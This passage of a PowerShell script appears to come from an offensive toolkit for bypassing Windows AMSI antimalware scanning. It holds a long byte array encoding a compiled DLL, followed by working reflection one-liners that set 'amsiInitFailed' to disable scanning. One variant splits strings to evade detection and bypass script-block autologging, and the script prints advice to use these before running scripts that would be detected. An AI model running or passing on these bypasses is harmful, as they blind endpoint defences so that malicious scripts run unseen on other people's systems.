203 205 41 131 37 224 27 0 0 0 72 141 77 240 51 210 65 184 208 4 0 0 232 151 3 0 0 72 141 77 240 255 21 173 5 0 0 72 139 157 232 0 0 0 72 141 149 216 4 0 0 72 139 203 69 51 192 255 21 139 5 0 0 72 133 192 116 60 72 131 100 36 56 0 72 141 141 224 4 0 0 72 139 149 216 4 0 0 76 139 200 72 137 76 36 48 76 139 195 72 141 141 232 4 0 0 72 137 76 36 40 72 141 77 240 72 137 76 36 32 51 201 255 21 66 5 0 0 72 139 133 200 4 0 0 72 141 76 36 80 72 137 133 232 0 0 0 51 210 72 141 133 200 4 0 0 65 184 152 0 0 0 72 131 192 8 72 137 133 136 0 0 0 232 0 3 0 0 72 139 133 200 4 0 0 72 137 68 36 96 199 68 36 80 21 0 0 64 199 68 36 84 1 0 0 0 255 21 14 5 0 0 131 248 1 72 141 68 36 80 72 137 68 36 64 72 141 69 240 15 148 195 72 137 68 36 72 51 201 255 21 45 5 0 0 72 141 76 36 64 255 21 186 4 0 0 133 192 117 10 246 219 27 192 33 5 220 26 0 0 72 139 156 36 208 5 0 0 72 129 196 192 5 0 0 93 195 204 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 154 9 0 0 72 141 53 147 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 105 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 94 9 0 0 72 141 53 87 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 29 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 255 37 241 4 0 0 204 72 137 92 36 16 85 72 139 236 72 131 236 32 131 101 232 0 51 201 51 192 199 5 245 19 0 0 2 0 0 0 15 162 68 139 193 199 5 226 19 0 0 1 0 0 0 65 129 240 110 116 101 108 68 139 202 65 129 241 105 110 101 73 68 139 210 69 11 200 139 211 129 242 71 101 110 117 68 139 216 68 11 202 184 1 0 0 0 65 15 148 192 129 241 99 65 77 68 129 243 65 117 116 104 65 129 242 101 110 116 105 65 11 218 11 217 65 15 148 194 51 201 15 162 68 139 201 137 69 240 69 132 192 68 137 77 248 68 139 5 156 25 0 0 139 200 137 93 244 137 85 252 116 82 72 131 13 118 19 0 0 255 65 131 200 4 37 240 63 255 15 68 137 5 122 25 0 0 61 192 6 1 0 116 40 61 96 6 2 0 116 33 61 112 6 2 0 116 26 5 176 249 252 255 131 248 32 119 27 72 187 1 0 1 0 1 0 0 0 72 15 163 195 115 11 65 131 200 1 68 137 5 64 25 0 0 69 132 210 116 25 129 225 0 15 240 15 129 249 0 15 96 0 124 11 65 131 200 4 68 137 5 34 25 0 0 184 7 0 0 0 137 85 224 68 137 77 228 68 59 216 124 36 51 201 15 162 137 69 240 137 93 244 137 77 248 137 85 252 137 93 232 15 186 227 9 115 11 65 131 200 2 68 137 5 237 24 0 0 65 15 186 225 20 115 110 199 5 192 18 0 0 2 0 0 0 199 5 186 18 0 0 6 0 0 0 65 15 186 225 27 115 83 65 15 186 225 28 115 76 51 201 15 1 208 72 193 226 32 72 11 208 72 137 85 16 72 139 69 16 36 6 60 6 117 50 139 5 140 18 0 0 131 200 8 199 5 123 18 0 0 3 0 0 0 246 69 232 32 137 5 117 18 0 0 116 19 131 200 32 199 5 98 18 0 0 5 0 0 0 137 5 96 18 0 0 51 192 72 139 92 36 56 72 131 196 32 93 195 204 204 204 51 192 57 5 92 18 0 0 15 149 192 195 194 0 0 204 204 204 204 204 255 37 178 2 0 0 255 37 164 2 0 0 255 37 150 2 0 0 255 37 136 2 0 0 255 37 122 2 0 0 255 37 228 2 0 0 255 37 214 2 0 0 255 37 200 2 0 0 255 37 186 2 0 0 255 37 172 2 0 0 255 37 158 2 0 0 255 37 144 2 0 0 255 37 130 2 0 0 255 37 116 2 0 0 255 37 30 2 0 0 204 204 176 1 195 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 255 224 64 85 72 131 236 32 72 139 234 138 77 64 72 131 196 32 93 233 4 250 255 255 204 64 85 72 131 236 32 72 139 234 232 45 248 255 255 138 77 56 72 131 196 32 93 233 232 249 255 255 204 64 85 72 131 236 48 72 139 234 72 139 1 139 16 72 137 76 36 40 137 84 36 32 76 141 13 161 241 255 255 76 139 69 112 139 85 104 72 139 77 96 232 93 247 255 255 144 72 131 196 48 93 195 204 64 85 72 139 234 72 139 1 51 201 129 56 5 0 0 192 15 148 193 139 193 93 195 204 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 216 29 0 128 1 0 0 0 80 30 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 48 0 128 1 0 0 0 240 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 136 29 62 87 0 0 0 0 2 0 0 0 65 0 0 0 116 34 0 0 116 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 184 34 0 0 184 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 13 0 0 0 68 2 0 0 204 34 0 0 204 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 32 0 128 1 0 0 0 0 33 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 82 83 68 83 42 80 223 113 29 247 64 69 188 37 18 40 145 144 25 190 50 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 120 54 52 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 18 0 0 0 18 0 0 0 1 0 0 0 17 0 0 0 71 67 84 76 0 16 0 0 63 14 0 0 46 116 101 120 116 36 109 110 0 0 0 0 64 30 0 0 18 0 0 0 46 116 101 120 116 36 109 110 36 48 48 0 82 30 0 0 129 0 0 0 46 116 101 120 116 36 120 0 0 32 0 0 248 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 248 32 0 0 16 0 0 0 46 48 48 99 102 103 0 0 8 33 0 0 8 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 16 33 0 0 8 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 24 33 0 0 8 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 32 33 0 0 8 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 40 33 0 0 8 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 48 33 0 0 8 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 56 33 0 0 8 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 64 33 0 0 8 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 80 33 0 0 36 1 0 0 46 114 100 97 116 97 0 0 116 34 0 0 156 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 16 37 0 0 8 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 24 37 0 0 8 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 32 37 0 0 8 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 40 37 0 0 8 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 48 37 0 0 60 1 0 0 46 120 100 97 116 97 0 0 108 38 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 168 38 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 192 38 0 0 248 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 184 39 0 0 200 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 52 0 0 0 46 100 97 116 97 0 0 0 64 48 0 0 0 6 0 0 46 98 115 115 0 0 0 0 0 64 0 0 176 1 0 0 46 112 100 97 116 97 0 0 0 80 0 0 16 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 96 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 96 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 17 21 8 0 21 116 9 0 21 100 7 0 21 52 6 0 21 50 17 224 236 29 0 0 1 0 0 0 207 16 0 0 92 17 0 0 82 30 0 0 0 0 0 0 17 15 6 0 15 100 8 0 15 52 6 0 15 50 11 112 236 29 0 0 1 0 0 0 246 17 0 0 20 18 0 0 105 30 0 0 0 0 0 0 1 6 2 0 6 50 2 80 1 20 8 0 20 100 8 0 20 84 7 0 20 52 6 0 20 50 16 112 9 26 6 0 26 52 15 0 26 114 22 224 20 112 19 96 236 29 0 0 1 0 0 0 102 18 0 0 54 19 0 0 133 30 0 0 54 19 0 0 1 6 2 0 6 82 2 80 1 9 1 0 9 98 0 0 1 8 4 0 8 114 4 112 3 96 2 48 9 4 1 0 4 34 0 0 236 29 0 0 1 0 0 0 215 23 0 0 101 24 0 0 187 30 0 0 101 24 0 0 1 2 1 0 2 80 0 0 1 4 1 0 4 66 0 0 1 6 2 0 6 50 2 48 1 13 4 0 13 52 10 0 13 114 6 80 1 13 4 0 13 52 9 0 13 50 6 80 1 21 5 0 21 52 186 0 21 1 184 0 6 80 0 0 1 15 6 0 15 100 7 0 15 52 6 0 15 50 11 112 1 13 4 0 13 52 7 0 13 50 6 80 0 0 0 0 1 0 0 0 56 39 0 0 0 0 0 0 0 0 0 0 62 40 0 0 120 32 0 0 104 39 0 0 0 0 0 0 0 0 0 0 6 41 0 0 168 32 0 0 192 38 0 0 0 0 0 0 0 0 0 0 114 42 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 8 0 95 95 67 95 115 112 101 99 105 102 105 99 95 104 97 110 100 108 101 114 0 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 62 0 109 101 109 115 101 116 0 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 54 0 95 105 110 105 116 116 101 114 109 0 55 0 95 105 110 105 116 116 101 114 109 95 101 0 63 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 51 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 52 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 60 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 34 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 30 0 95 99 114 116 95 97 116 101 120 105 116 0 22 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 174 4 82 116 108 67 97 112 116 117 114 101 67 111 110 116 101 120 116 0 181 4 82 116 108 76 111 111 107 117 112 70 117 110 99 116 105 111 110 69 110 116 114 121 0 0 188 4 82 116 108 86 105 114 116 117 97 108 85 110 119 105 110 100 0 0 146 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 82 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 15 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 112 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 112 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 48 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 16 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 20 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 221 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 84 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 106 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 50 162 223 45 153 43 0 0 205 93 32 210 102 212 255 255 255 255 255 255 0 0 0 0 1 0 0 0 2 0 0 0 47 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 16 0 0 65 16 0 0 48 37 0 0 68 16 0 0 148 16 0 0 16 38 0 0 148 16 0 0 191 17 0 0 52 37 0 0 192 17 0 0 66 18 0 0 96 37 0 0 68 18 0 0 76 19 0 0 164 37 0 0 76 19 0 0 160 19 0 0 144 37 0 0 160 19 0 0 221 19 0 0 72 38 0 0 224 19 0 0 20 20 0 0 24 38 0 0 20 20 0 0 229 20 0 0 212 37 0 0 232 20 0 0 89 21 0 0 220 37 0 0 92 21 0 0 149 21 0 0 16 38 0 0 152 21 0 0 184 21 0 0 16 38 0 0 184 21 0 0 205 21 0 0 16 38 0 0 208 21 0 0 248 21 0 0 16 38 0 0 248 21 0 0 13 22 0 0 16 38 0 0 16 22 0 0 113 22 0 0 144 37 0 0 116 22 0 0 164 22 0 0 16 38 0 0 164 22 0 0 184 22 0 0 16 38 0 0 184 22 0 0 1 23 0 0 24 38 0 0 4 23 0 0 205 23 0 0 32 38 0 0 208 23 0 0 108 24 0 0 232 37 0 0 108 24 0 0 144 24 0 0 24 38 0 0 144 24 0 0 187 24 0 0 24 38 0 0 188 24 0 0 11 25 0 0 24 38 0 0 12 25 0 0 35 25 0 0 16 38 0 0 36 25 0 0 208 25 0 0 44 38 0 0 252 25 0 0 23 26 0 0 16 38 0 0 32 26 0 0 101 27 0 0 56 38 0 0 104 27 0 0 178 27 0 0 72 38 0 0 180 27 0 0 254 27 0 0 72 38 0 0 8 28 0 0 201 29 0 0 88 38 0 0 80 30 0 0 82 30 0 0 104 38 0 0 82 30 0 0 105 30 0 0 136 37 0 0 105 30 0 0 133 30 0 0 136 37 0 0 133 30 0 0 187 30 0 0 204 37 0 0 187 30 0 0 211 30 0 0 8 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 11 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 96 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 24 0 0 0 248 160 0 161 88 161 96 161 56 162 80 162 88 162 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\"\n\n    if (([IntPtr]::Size) -eq 8)\n    {\n        Write-Verbose \"64 bit process detected.\"\n        $DllBytes = $AmsiX64\n    }\n    elseif (([IntPtr]::Size) -eq 4)\n    {\n        Write-Verbose \"32 bit process detected.\"\n        $DllBytes = $AmsiX86\n    }\n\n    switch($method)\n    {\n\n        \"unload\"\n        {\n            Write-Verbose \"Using Matt Graeber's Reflection method.\"\n            if ($ShowOnly -eq $True)\n            {\n                Write-Output \"Use the following scriptblock before you run a script which gets detected.\"\n                Write-Output '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)'\n            }\n            else\n            {\n                Write-Output \"Executing the bypass.\"\n                [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n            }\n        }\n\n        \"unloadsilent\"\n        {\n            Write-Verbose \"Using Matt Graeber's Reflection method with WMF5 autologging bypass.\"\n            if ($ShowOnly -eq $True)\n            {\n                Write-Output \"Use the following scriptblock before you run a script which gets detected.\"\n                Write-Output '[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags'')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType(''System.T''+''ype'')), [Object]([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')),(''GetFie''+''ld'')).Invoke(''amsiInitFailed'',((''Non''+''Public,Static'') -as [String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags''))).SetValue($null,$True)'\n            